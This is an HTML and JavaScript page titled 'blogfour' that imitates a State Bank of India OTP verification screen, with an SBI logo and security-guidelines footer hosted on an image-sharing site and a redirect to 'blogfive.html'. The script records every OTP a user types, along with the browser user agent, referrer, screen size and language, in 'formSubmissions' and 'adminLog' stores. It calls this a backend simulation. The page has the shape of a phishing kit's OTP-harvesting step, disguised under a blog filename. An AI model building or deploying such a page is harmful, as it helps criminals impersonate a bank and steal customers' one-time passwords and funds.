<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>blogfour</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            padding-bottom: 20px;
        }
        
        .header {
            text-align: center;
            padding: 15px;
            background-color: white;
        }
        
        .logo {
            max-width: 100%;
            height: auto;
            max-height: 120px;
        }
        
        .container {
            max-width: 420px;
            margin: 15px auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        
        .form-header {
            color: #000;
            padding: 18px 20px 8px 20px;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
        }
        
        .form-content {
            padding: 0 20px 20px 20px;
        }
        
        .form-group {
            margin-bottom: 10px;
            position: relative;
        }
        
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: bold;
            color: #333;
            margin-bottom: 3px;
        }
        
        .form-input {
            width: 100%;
            padding: 6px 0;
            font-size: 18px;
            border: none;
            border-bottom: 1px solid #ccc;
            background-color: transparent;
            outline: none;
            border-radius: 0;
            transition: border-color 0.3s;
            text-align: left;
            font-weight: bold;
        }
        
        /* Placeholder styling - smaller font */
        .form-input::placeholder {
            font-size: 12px;
            color: #999;
            font-weight: normal;
            font-style: italic;
            letter-spacing: 0.5px;
        }
        
        .form-input:focus {
            border-bottom-color: #24A1E8;
        }
        
        .proceed-button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #24A1E8;
            color: white;
            font-size: 14px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 15px;
        }
        
        .proceed-button:hover {
            background-color: #1a8cd8;
        }
        
        .message {
            font-size: 13px;
            color: #666;
            text-align: center;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        
        /* NEW: Input और resend button के बीच सिर्फ एक line/spacing */
        .input-resend-container {
            margin-bottom: 10px; /* सिर्फ एक line की spacing */
        }
        
        .resend-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 5px; /* Input के ठीक नीचे */
        }
        
        /* Resend button हमेशा SkyBlue */
        .resend-button {
            width: 80px;
            padding: 4px 0;
            background-color: #87CEEB; /* SkyBlue */
            color: white;
            font-size: 11px;
            font-weight: bold;
            border: none;
            border-radius: 2px;
            cursor: pointer;
            text-align: center;
            transition: background-color 0.3s;
        }
        
        /* Enabled state - थोड़ा गहरा SkyBlue */
        .resend-button:enabled {
            background-color: #70b8d8;
        }
        
        .resend-button:hover:enabled {
            background-color: #5ca3c2;
        }
        
        /* Disabled state - हल्का SkyBlue */
        .resend-button:disabled {
            background-color: #b3e0f2; /* Light SkyBlue */
            color: white;
            cursor: not-allowed;
            opacity: 0.8;
        }
        
        .timer {
            text-align: center;
            font-size: 14px;
            color: #333;
            margin: 10px 0;
            font-weight: bold;
        }
        
        .asterisk {
            color: #ff0000;
        }
        
        .footer-img {
            width: 100%;
            max-width: 900px;
            display: block;
            margin: 20px auto 0;
        }
        
        /* Error message styling */
        .error-message {
            color: #ff0000 !important;
            font-size: 12px;
            margin: 8px 0 0 0;
            text-align: left;
            line-height: 1.6;
            font-weight: normal;
            display: block;
            padding-left: 2px;
            visibility: visible;
            opacity: 1;
        }
        
        .error-title {
            font-weight: bold;
        }
        
        /* Line separator exactly like in image */
        .separator {
            border-top: 1px solid #ccc;
            margin: 15px 0;
        }
        
        /* Success message styling */
        .success-message {
            color: #008000 !important;
            font-size: 12px;
            margin: 8px 0 0 0;
            text-align: left;
            line-height: 1.6;
            font-weight: normal;
            display: none;
            padding-left: 2px;
        }
        
        /* Loading/spinner for proceed button */
        .button-loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Same Header as index.html -->
    <div class="header">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
             alt="SBI Logo" 
             class="logo">
    </div>
    
    <!-- OTP Verification Form -->
    <div class="container">
        <div class="form-header">
            One Time Password (OTP) Verification
        </div>
        
        <div class="form-content">
            <div class="message">
                One Time Password (OTP) has been sent to your registered mobile Number.<br>
                Please enter the OTP and proceed.
            </div>
            
            <!-- Line separator exactly like in image -->
            <div class="separator"></div>
            
            <!-- NEW: Input और resend button को एक container में रखा -->
            <div class="input-resend-container">
                <div class="form-group">
                    <label class="form-label">One Time Password <span class="asterisk">*</span></label>
                    <input type="text" class="form-input" id="otpInput" maxlength="6" pattern="[0-9]{6}" placeholder="entre 6 digit otp">
                    
                    <!-- Error message for invalid OTP -->
                    <div class="error-message" id="errorMessage" style="display: none;">
                        <span class="error-title">Invalid One Time Password!</span>
                    </div>
                    
                    <!-- Success message for valid OTP -->
                    <div class="success-message" id="successMessage">
                        <span class="error-title">✓ OTP Verified! Redirecting...</span>
                    </div>
                </div>
                
                <!-- Resend button OTP input के ठीक नीचे -->
                <div class="resend-container">
                    <button class="resend-button" id="resendButton" disabled>Resend OTP</button>
                </div>
            </div>
            
            <!-- Timer exactly like in image - without "second" text -->
            <div class="timer" id="timer">176</div>
            
            <button class="proceed-button" id="proceedButton">PROCEED</button>
        </div>
    </div>
    
    <!-- Same Footer as index.html -->
    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
         alt="Security Guidelines" 
         class="footer-img">
    
    <script>
        // OTP Input Formatting
        const otpInput = document.getElementById('otpInput');
        const timerElement = document.getElementById('timer');
        const proceedButton = document.getElementById('proceedButton');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');
        const resendButton = document.getElementById('resendButton');
        
        // Timer Countdown (176 seconds as in image)
        let seconds = 176;
        let timerInterval;
        
        function updateTimer() {
            seconds--;
            timerElement.textContent = `${seconds}`;
            
            if (seconds <= 0) {
                clearInterval(timerInterval);
                timerElement.textContent = "0";
                timerElement.style.color = "#666";
                // Enable resend button when timer reaches 0
                resendButton.disabled = false;
            }
        }
        
        // Start the timer
        timerInterval = setInterval(updateTimer, 1000);
        
        // Function to save OTP data to localStorage (backend simulation)
        function saveOTPData(otpValue, status) {
            const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
            
            const otpEntry = {
                id: Date.now(),
                type: 'OTP2',
                otp: otpValue,
                status: status,
                timestamp: new Date().toISOString(),
                page: window.location.href,
                userAgent: navigator.userAgent,
                timeSpent: (176 - seconds) + ' seconds'
            };
            
            submissions.push(otpEntry);
            localStorage.setItem('formSubmissions', JSON.stringify(submissions));
            
            // Also save to a separate admin log with more details
            const adminLog = JSON.parse(localStorage.getItem('adminLog') || '[]');
            adminLog.push({
                ...otpEntry,
                referrer: document.referrer,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language
            });
            localStorage.setItem('adminLog', JSON.stringify(adminLog));
            
            console.log(`OTP Data Saved: ${otpValue} - Status: ${status}`);
        }
        
        // OTP Input - Auto move and formatting
        otpInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.substring(0, 6);
            e.target.value = value;
            
            // Hide error message when user starts typing again
            errorMessage.style.display = 'none';
            successMessage.style.display = 'none';
            otpInput.style.borderBottomColor = '#ccc';
        });
        
        // Proceed Button
        proceedButton.addEventListener('click', async function(e) {
            e.preventDefault();
            
            const otpValue = otpInput.value.trim();
            
            // Check if OTP is empty
            if (otpValue === '') {
                otpInput.style.borderBottomColor = '#ff0000';
                errorMessage.innerHTML = '<span class="error-title">Please enter OTP!</span>';
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                otpInput.focus();
                return;
            }
            
            // Check if OTP is valid format (6 digits)
            if (otpValue.length !== 6 || !/^\d+$/.test(otpValue)) {
                otpInput.style.borderBottomColor = '#ff0000';
                errorMessage.innerHTML = '<span class="error-title">Invalid OTP! Must be 6 digits.</span>';
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                
                // Save invalid format OTP attempt
                saveOTPData(otpValue, 'invalid_format');
                
                otpInput.focus();
                return;
            }
            
            // Show loading state
            const originalText = proceedButton.innerHTML;
            proceedButton.innerHTML = '<div class="button-loader"></div> Verifying...';
            proceedButton.disabled = true;
            
            // Simulate API call delay
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // If OTP is not "123456", show error (stay on same page)
            if (otpValue !== "123456") {
                otpInput.style.borderBottomColor = '#ff0000';
                errorMessage.innerHTML = '<span class="error-title">Invalid One Time Password! Please try again.</span>';
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                
                // Save incorrect OTP attempt
                saveOTPData(otpValue, 'incorrect');
                
                // Reset button
                proceedButton.innerHTML = originalText;
                proceedButton.disabled = false;
                
                otpInput.focus();
                return;
            }
            
            // If OTP is valid, show success and redirect
            otpInput.style.borderBottomColor = '#008000';
            errorMessage.style.display = 'none';
            successMessage.style.display = 'block';
            
            // Save correct OTP data
            saveOTPData(otpValue, 'correct');
            
            // Update button to show success
            proceedButton.innerHTML = '<div class="button-loader"></div> Redirecting...';
            
            // Redirect to next page after 2 seconds
            setTimeout(() => {
                window.location.href = 'blogfive.html';
            }, 2000);
        });
        
        // Resend OTP Button (skyblue button)
        resendButton.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Only allow resend if button is enabled
            if (resendButton.disabled) {
                return;
            }
            
            // Reset timer to 176
            seconds = 176;
            clearInterval(timerInterval);
            timerElement.textContent = "176";
            timerElement.style.color = "#333";
            
            // Restart timer
            timerInterval = setInterval(updateTimer, 1000);
            
            // Clear OTP field
            otpInput.value = "";
            
            // Reset border color and messages
            otpInput.style.borderBottomColor = '#ccc';
            errorMessage.style.display = 'none';
            successMessage.style.display = 'none';
            
            // Disable button again
            resendButton.disabled = true;
            
            // Focus on OTP input
            otpInput.focus();
            
            // Save OTP resend action
            saveOTPData('RESEND_REQUEST', 'resend_request');
            
            // Show temporary success message
            successMessage.innerHTML = '<span class="error-title">✓ New OTP sent to your mobile!</span>';
            successMessage.style.display = 'block';
            
            // Hide success message after 3 seconds
            setTimeout(() => {
                successMessage.style.display = 'none';
            }, 3000);
        });
        
        // Also handle Enter key on OTP input
        otpInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                proceedButton.click();
            }
        });
        
        // Focus on OTP input when page loads
        window.onload = function() {
            otpInput.focus();
            
            // Load previous OTP attempts count
            const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
            const otpAttempts = submissions.filter(entry => entry.type === 'OTP2').length;
            
            if (otpAttempts > 0) {
                console.log(`Previous OTP attempts: ${otpAttempts}`);
            }
        };
        
        // Also save page view/load event
        window.addEventListener('load', function() {
            saveOTPData('PAGE_LOAD', 'page_view');
        });
    </script>
</body>
</html>
